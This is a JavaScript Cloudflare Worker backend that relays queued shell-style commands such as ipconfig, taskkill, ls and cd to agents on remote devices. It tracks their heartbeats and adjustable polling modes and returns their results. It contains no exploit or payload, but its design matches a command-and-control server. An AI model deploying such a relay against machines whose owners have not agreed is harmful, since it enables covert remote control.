/**
 * TELELLUC LOG-AUTH WORKER - Cloudflare Workers Backend
 *
 * CRITICAL ARCHITECTURE NOTES:
 * =============================
 * COMMAND STORAGE: KV key = "command:${deviceId}" (ONE command per device)
 *   - Agent polls every 5 seconds to dequeue
 *   - Frontend queues new command by overwriting old one (only 1 can be pending)
 *   - This is INTENTIONAL - prevents command accumulation
 *
 * RESULT STORAGE: KV key = "command-result:${deviceId}" (ONE result per device)
 *   - Agent stores result here after execution
 *   - Frontend retrieves and IMMEDIATELY deletes
 *   - Next command overwrites this slot (no contamination)
 *   - TTL = 600 seconds (should delete before that)
 *
 * OUTPUT ISOLATION:
 *   - Query commands (ipconfig, disk, sysinfo, processes, taskkill) use SIMPLE pattern
 *   - Control commands (cd, ls, nano, etc) use requestId for multi-step isolation
 *   - DO NOT mix patterns - query commands must NOT use requestId
 *   - Simple pattern: last result wins, gets deleted immediately
 *
 * TIMEOUTS & RETRIES:
 *   - Frontend retries: 80 attempts × 150ms = 12 seconds max
 *   - Agent heartbeat: 60 seconds
 *   - Inactivity threshold: 130 seconds (offline after 2+ missed heartbeats)
 *   - If increasing timeout, verify agent can execute command in that time
 *
 * COMMIT GUIDELINES:
 * ==================
 * Format: git commit -m "vX.X.X
 *
 * Description of changes
 *
 * Changes:
 * - Specific change 1
 * - Specific change 2
 *
 * Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>"
 *
 * DEPLOYMENT:
 * npx wrangler deploy -c wrangler-auth.toml
 */

const HEARTBEAT_INTERVAL_SECONDS = 60;
const COMMAND_CHECK_INTERVAL_SECONDS = 5;  // Normal polling (5s)
const COMMAND_CHECK_INTERVAL_MIMETIC = 2;  // Fast polling only during mimetic (2s)
const INACTIVITY_THRESHOLD_SECONDS = 130;
const SLOW_HEARTBEAT_INTERVAL_SECONDS = 300;
const SLOW_COMMAND_CHECK_INTERVAL_SECONDS = 300;
const SLOW_INACTIVITY_THRESHOLD_SECONDS = 360;
const ONLINE_GRACE_PERIOD_MS = 130 * 1000;

export default {
    async fetch(request, env) {
        const url = new URL(request.url);

        if (url.pathname === "/heartbeat" && request.method === "POST") {
            return handleHeartbeat(request, env);
        }

        if (url.pathname === "/devices" && request.method === "GET") {
            return handleDevices(request, env);
        }

        if (url.pathname === "/command" && request.method === "POST") {
            return handleCommandQueue(request, env);
        }

        if (url.pathname === "/command" && request.method === "GET") {
            return handleCommandDequeue(request, env);
        }

        if (url.pathname === "/command-result" && request.method === "POST") {
            return handleCommandResult(request, env);
        }

        if (url.pathname === "/command-result" && request.method === "GET") {
            return handleGetCommandResult(request, env);
        }

        if (url.pathname === "/devices" && request.method === "DELETE") {
            return handleDeleteDevice(request, env);
        }

        if (url.pathname === "/reset-id" && request.method === "POST") {
            return handleResetId(request, env);
        }

        if (url.pathname === "/mark-offline" && request.method === "POST") {
            return handleMarkOffline(request, env);
        }

        if (url.pathname === "/slow-mode" && request.method === "POST") {
            return handleSlowMode(request, env);
        }

        if (url.pathname === "/mimetic-mode" && request.method === "POST") {
            return handleMimeticMode(request, env);
        }

        if (url.pathname === "/usage" && request.method === "GET") {
            return handleUsage(request, env);
        }

        return new Response("Not found", { status: 404 });
    }
};

function checkBearer(request, expected) {
    const auth = request.headers.get("Authorization") || "";
    const match = auth.match(/^Bearer (.+)$/);
    return !!match && !!expected && match[1] === expected;
}

async function getIntervals(env, deviceId) {
    // Check if device is in slow mode
    const slowModeRaw = await env.DEVICES_KV.get(`slow-mode:${deviceId}`);
    let isSlowed = false;
    if (slowModeRaw) {
        try {
            isSlowed = JSON.parse(slowModeRaw).enabled || false;
        } catch (e) {
            isSlowed = false;
        }
    }

    // Check if device is in mimetic mode (temporarily faster polling)
    const mimeticModeRaw = await env.DEVICES_KV.get(`mimetic-mode:${deviceId}`);
    let isMimetic = false;
    if (mimeticModeRaw) {
        try {
            isMimetic = JSON.parse(mimeticModeRaw).enabled || false;
        } catch (e) {
            isMimetic = false;
        }
    }

    if (isSlowed) {
        return {
            heartbeat: SLOW_HEARTBEAT_INTERVAL_SECONDS,
            commandCheck: SLOW_COMMAND_CHECK_INTERVAL_SECONDS,
            inactivityThreshold: SLOW_INACTIVITY_THRESHOLD_SECONDS
        };
    } else if (isMimetic) {
        // Fast polling only during mimetic execution
        return {
            heartbeat: HEARTBEAT_INTERVAL_SECONDS,
            commandCheck: COMMAND_CHECK_INTERVAL_MIMETIC,
            inactivityThreshold: INACTIVITY_THRESHOLD_SECONDS
        };
    } else {
        return {
            heartbeat: HEARTBEAT_INTERVAL_SECONDS,
            commandCheck: COMMAND_CHECK_INTERVAL_SECONDS,
            inactivityThreshold: INACTIVITY_THRESHOLD_SECONDS
        };
    }
}

async function handleHeartbeat(request, env) {
    if (!checkBearer(request, env.AGENT_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    let body;
    try {
        body = await request.json();
    } catch (e) {
        return new Response("Bad Request", { status: 400 });
    }

    const hostname = body && body.hostname ? String(body.hostname).slice(0, 100) : null;
    if (!hostname) {
        return new Response("Missing hostname", { status: 400 });
    }

    const ip = request.headers.get("cf-connecting-ip") || "unknown";
    const key = `device:${hostname}`;

    const existingRaw = await env.DEVICES_KV.get(key);
    let record;
    if (existingRaw) {
        try {
            record = JSON.parse(existingRaw);
        } catch (e) {
            record = {};
        }
        record.ip = ip;
        record.lastSeen = Date.now();
    } else {
        const id = await nextId(env);
        record = { id, hostname, ip, lastSeen: Date.now() };
    }

    await env.DEVICES_KV.put(key, JSON.stringify(record));
    const intervals = await getIntervals(env, record.id);
    return new Response(JSON.stringify({
        ok: true,
        id: record.id,
        heartbeat: intervals.heartbeat,
        commandCheck: intervals.commandCheck,
        inactivityThreshold: intervals.inactivityThreshold
    }), {
        headers: { "content-type": "application/json" }
    });
}

async function nextId(env) {
    const raw = await env.DEVICES_KV.get("next_id");
    const current = raw ? parseInt(raw, 10) : 0;
    const next = current + 1;
    await env.DEVICES_KV.put("next_id", String(next));
    return next;
}

async function handleDevices(request, env) {
    if (!checkBearer(request, env.INTERNAL_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    const list = await env.DEVICES_KV.list({ prefix: "device:" });
    const devices = [];
    for (const entry of list.keys) {
        const raw = await env.DEVICES_KV.get(entry.name);
        if (!raw) continue;
        const record = JSON.parse(raw);
        const ageMs = Date.now() - record.lastSeen;

        const slowModeRaw = await env.DEVICES_KV.get(`slow-mode:${record.id}`);
        const isSlowed = slowModeRaw ? JSON.parse(slowModeRaw).enabled : false;

        // In slow mode:
        // - First 5 min: show "active"
        // - After 5 min: show elapsed time but still "slowed"
        // - After 6 min: "offline"
        const SLOW_ACTIVE_THRESHOLD_MS = 5 * 60 * 1000;  // 5 minutes
        const SLOW_OFFLINE_THRESHOLD_MS = 6 * 60 * 1000; // 6 minutes
        const NORMAL_THRESHOLD_MS = ONLINE_GRACE_PERIOD_MS;

        let status;
        if (isSlowed) {
            if (ageMs < SLOW_ACTIVE_THRESHOLD_MS) {
                status = 'active';
            } else if (ageMs < SLOW_OFFLINE_THRESHOLD_MS) {
                status = 'slowed';
            } else {
                status = 'offline';
            }
        } else {
            status = ageMs < NORMAL_THRESHOLD_MS ? 'online' : 'offline';
        }

        devices.push({
            id: record.id,
            hostname: record.hostname,
            ip: record.ip,
            lastSeen: record.lastSeen,
            online: ageMs < (isSlowed ? SLOW_OFFLINE_THRESHOLD_MS : NORMAL_THRESHOLD_MS),
            status
        });
    }
    devices.sort((a, b) => a.id - b.id);

    return new Response(JSON.stringify({ devices }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleCommandQueue(request, env) {
    if (!checkBearer(request, env.INTERNAL_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    let body;
    try {
        body = await request.json();
    } catch (e) {
        return new Response("Bad Request", { status: 400 });
    }

    const deviceId = body && body.deviceId ? String(body.deviceId) : null;
    const command = body && body.command ? String(body.command) : null;
    const payload = body && body.payload ? String(body.payload) : null;
    const requestId = body && body.requestId ? String(body.requestId) : null;
    const cantidadRaw = body && (body.cantidad ?? body.amount ?? body.qty);
    const cantidad = Number.isFinite(Number(cantidadRaw))
        ? Math.max(1, Math.floor(Number(cantidadRaw)))
        : 1;

    if (!deviceId || !command) {
        return new Response("Missing deviceId or command", { status: 400 });
    }

    const key = `command:${deviceId}`;
    await env.DEVICES_KV.put(key, JSON.stringify({ command, cantidad, payload, requestId, timestamp: Date.now() }), {
        expirationTtl: 300
    });

    return new Response(JSON.stringify({ ok: true }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleCommandDequeue(request, env) {
    if (!checkBearer(request, env.AGENT_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    const url = new URL(request.url);
    const deviceId = url.searchParams.get("deviceId");
    if (!deviceId) {
        return new Response("Missing deviceId", { status: 400 });
    }

    const key = `command:${deviceId}`;
    const raw = await env.DEVICES_KV.get(key);
    const intervals = await getIntervals(env, deviceId);

    if (!raw) {
        return new Response(JSON.stringify({
            command: null,
            heartbeat: intervals.heartbeat,
            commandCheck: intervals.commandCheck,
            inactivityThreshold: intervals.inactivityThreshold
        }), {
            headers: { "content-type": "application/json" }
        });
    }

    let cmd;
    try {
        cmd = JSON.parse(raw);
    } catch (e) {
        return new Response(JSON.stringify({
            command: null,
            heartbeat: intervals.heartbeat,
            commandCheck: intervals.commandCheck,
            inactivityThreshold: intervals.inactivityThreshold
        }), {
            headers: { "content-type": "application/json" }
        });
    }

    await env.DEVICES_KV.delete(key);
    // ⚠️ DO NOT TOUCH: Conditional requestId inclusion
    // REASON: Python's "if requestId:" check is FALSE on empty string ""
    // INCIDENT: v0.1.56 returned "" instead of omitting, agent ignored it
    // CONSEQUENCE: All commands used same KV key → complete output contamination
    // SOLUTION: Only include requestId field if it has actual value
    // MATH: Python bool("") = False; bool(None) = False; bool("xyz") = True
    const response = {
        command: cmd.command,
        cantidad: typeof cmd.cantidad === "number" ? cmd.cantidad : 1,
        payload: cmd.payload || "",
        heartbeat: intervals.heartbeat,
        commandCheck: intervals.commandCheck,
        inactivityThreshold: intervals.inactivityThreshold
    };
    if (cmd.requestId) {
        response.requestId = cmd.requestId;
    }
    return new Response(JSON.stringify(response), {
        headers: { "content-type": "application/json" }
    });
}

async function handleCommandResult(request, env) {
    // Agent POSTs result here after executing command
    if (!checkBearer(request, env.AGENT_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    let body;
    try {
        body = await request.json();
    } catch (e) {
        return new Response("Bad Request", { status: 400 });
    }

    const deviceId = body && body.deviceId ? String(body.deviceId) : null;
    const result = body && body.result ? body.result : null;
    const requestId = body && body.requestId ? String(body.requestId) : null;
    const timestamp = body && body.timestamp ? body.timestamp : Date.now();

    if (!deviceId || !result) {
        return new Response("Missing deviceId or result", { status: 400 });
    }

    // ⚠️ DO NOT TOUCH: KV Key Generation Logic
    // REASON: v0.1.50 removed requestId logic and broke control mode (ls, cd, etc)
    // INCIDENT: Control commands timed out while query commands worked
    // Support both patterns:
    // - Control mode (with requestId): command-result:${deviceId}:${requestId}
    // - Query commands (without requestId): command-result:${deviceId}
    const key = requestId ? `command-result:${deviceId}:${requestId}` : `command-result:${deviceId}`;

    // ⚠️ DO NOT TOUCH: requestId in JSON payload
    // REASON: v0.1.54 removed it and control mode couldn't match results
    // INCIDENT: ls, cd showed timeout despite agent executing successfully
    // Frontend validates response contains correct requestId
    await env.DEVICES_KV.put(key, JSON.stringify({ result, requestId, timestamp }), {
        expirationTtl: 600
    });

    return new Response(JSON.stringify({ ok: true }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleGetCommandResult(request, env) {
    // Frontend polls here repeatedly until result arrives
    // CRITICAL: Delete IMMEDIATELY after returning (prevents output contamination)
    if (!checkBearer(request, env.INTERNAL_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    const url = new URL(request.url);
    const deviceId = url.searchParams.get("deviceId");
    const requestId = url.searchParams.get("requestId");
    if (!deviceId) {
        return new Response("Missing deviceId", { status: 400 });
    }

    // Support both patterns:
    // - Control mode (with requestId): command-result:${deviceId}:${requestId}
    // - Query commands (without requestId): command-result:${deviceId}
    const key = requestId ? `command-result:${deviceId}:${requestId}` : `command-result:${deviceId}`;
    const raw = await env.DEVICES_KV.get(key);
    if (!raw) {
        // Frontend retries when result is null (agent hasn't finished yet)
        return new Response(JSON.stringify({ result: null }), {
            headers: { "content-type": "application/json" }
        });
    }

    const data = JSON.parse(raw);
    // ⚠️ DO NOT TOUCH: Immediate deletion after retrieval
    // REASON: v0.1.50 changed result storage to simple key, output contamination occurred
    // INCIDENT: Running "disk 1" followed by "ipconfig 1" mixed their outputs
    // DELETE IMMEDIATELY: Prevents next command from seeing previous result
    await env.DEVICES_KV.delete(key);
    return new Response(JSON.stringify(data), {
        headers: { "content-type": "application/json" }
    });
}

async function handleMarkOffline(request, env) {
    if (!checkBearer(request, env.AGENT_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    let body;
    try {
        body = await request.json();
    } catch (e) {
        return new Response("Bad Request", { status: 400 });
    }

    const hostname = body && body.hostname ? String(body.hostname) : null;
    if (!hostname) {
        return new Response("Missing hostname", { status: 400 });
    }

    const key = `device:${hostname}`;
    const raw = await env.DEVICES_KV.get(key);
    if (raw) {
        const record = JSON.parse(raw);
        record.lastSeen = Date.now() - (ONLINE_GRACE_PERIOD_MS + 1000);
        await env.DEVICES_KV.put(key, JSON.stringify(record));
    }

    return new Response(JSON.stringify({ ok: true }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleResetId(request, env) {
    if (!checkBearer(request, env.INTERNAL_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    await env.DEVICES_KV.put("next_id", "0");

    const allKeys = await env.DEVICES_KV.list({ limit: 1000 });
    for (const entry of allKeys.keys) {
        if (!entry.name.startsWith("device:") && entry.name !== "next_id") {
            try {
                await env.DEVICES_KV.delete(entry.name);
            } catch (e) {
                // ignore
            }
        }
    }

    return new Response(JSON.stringify({ ok: true, message: "ID counter reset to 1" }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleDeleteDevice(request, env) {
    if (!checkBearer(request, env.INTERNAL_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    const url = new URL(request.url);
    const deviceId = url.searchParams.get("deviceId");
    if (!deviceId) {
        return new Response("Missing deviceId", { status: 400 });
    }

    const list = await env.DEVICES_KV.list({ prefix: "device:" });
    let found = false;
    for (const entry of list.keys) {
        const raw = await env.DEVICES_KV.get(entry.name);
        if (!raw) continue;
        const record = JSON.parse(raw);
        if (String(record.id) === String(deviceId)) {
            await env.DEVICES_KV.delete(entry.name);
            found = true;
            break;
        }
    }

    if (!found) {
        return new Response(JSON.stringify({ error: "device not found" }), {
            status: 404,
            headers: { "content-type": "application/json" }
        });
    }

    const remainingList = await env.DEVICES_KV.list({ prefix: "device:" });
    if (remainingList.keys.length === 0) {
        await env.DEVICES_KV.put("next_id", "0");
        const allKeys = await env.DEVICES_KV.list({ limit: 1000 });
        for (const entry of allKeys.keys) {
            if (!entry.name.startsWith("device:")) {
                try {
                    await env.DEVICES_KV.delete(entry.name);
                } catch (e) {
                    // ignore
                }
            }
        }
    }

    return new Response(JSON.stringify({ ok: true }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleSlowMode(request, env) {
    if (!checkBearer(request, env.INTERNAL_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    let body;
    try {
        body = await request.json();
    } catch (e) {
        return new Response("Bad Request", { status: 400 });
    }

    const deviceId = body && body.deviceId ? String(body.deviceId) : null;
    const enabled = body && typeof body.enabled === 'boolean' ? body.enabled : false;

    if (!deviceId) {
        return new Response("Missing deviceId", { status: 400 });
    }

    const slowModeKey = `slow-mode:${deviceId}`;
    if (enabled) {
        await env.DEVICES_KV.put(slowModeKey, JSON.stringify({ enabled: true, timestamp: Date.now() }));
    } else {
        await env.DEVICES_KV.delete(slowModeKey);
    }

    return new Response(JSON.stringify({ ok: true }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleMimeticMode(request, env) {
    if (!checkBearer(request, env.AGENT_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    const url = new URL(request.url);
    const deviceId = url.searchParams.get("deviceId");
    const enabled = url.searchParams.get("enabled") === "true";

    if (!deviceId) {
        return new Response("Missing deviceId", { status: 400 });
    }

    const mimeticModeKey = `mimetic-mode:${deviceId}`;
    if (enabled) {
        // Enable fast polling during mimetic (10 second TTL)
        await env.DEVICES_KV.put(
            mimeticModeKey,
            JSON.stringify({ enabled: true, timestamp: Date.now() }),
            { expirationTtl: 10 }  // Auto-disable after 10 seconds
        );
    } else {
        await env.DEVICES_KV.delete(mimeticModeKey);
    }

    return new Response(JSON.stringify({ ok: true }), {
        headers: { "content-type": "application/json" }
    });
}

async function handleUsage(request, env) {
    // Accept both INTERNAL_TOKEN (from frontend) and AGENT_TOKEN (from agent)
    if (!checkBearer(request, env.INTERNAL_TOKEN) && !checkBearer(request, env.AGENT_TOKEN)) {
        return new Response("Unauthorized", { status: 401 });
    }

    try {
        // Get usage statistics from KV
        const usageKey = "usage:stats";
        const usageRaw = await env.DEVICES_KV.get(usageKey);
        let usage = { requests: 0, devices: 0, lastReset: Date.now() };

        if (usageRaw) {
            try {
                usage = JSON.parse(usageRaw);
            } catch (e) {
                // Reset if corrupted
            }
        }

        // Count active devices
        const deviceList = await env.DEVICES_KV.list({ prefix: "device:" });
        const activeDevices = deviceList.keys.length;

        // Get approximate requests (rough estimate from KV operations)
        // Note: Actual usage is tracked by Cloudflare, this is for reference
        const dailyLimit = 100000; // Standard Cloudflare Workers request limit
        const estimatedUsage = Math.min(usage.requests || 0, dailyLimit);
        const percentageUsed = ((estimatedUsage / dailyLimit) * 100).toFixed(2);

        return new Response(JSON.stringify({
            ok: true,
            usage: {
                estimatedRequests: estimatedUsage,
                dailyLimit: dailyLimit,
                percentageUsed: percentageUsed + "%",
                activeDevices: activeDevices,
                timestamp: Date.now(),
                note: "Actual usage tracked by Cloudflare Analytics Engine"
            }
        }), {
            headers: { "content-type": "application/json" }
        });
    } catch (e) {
        return new Response(JSON.stringify({ ok: false, error: e.message }), {
            status: 500,
            headers: { "content-type": "application/json" }
        });
    }
}
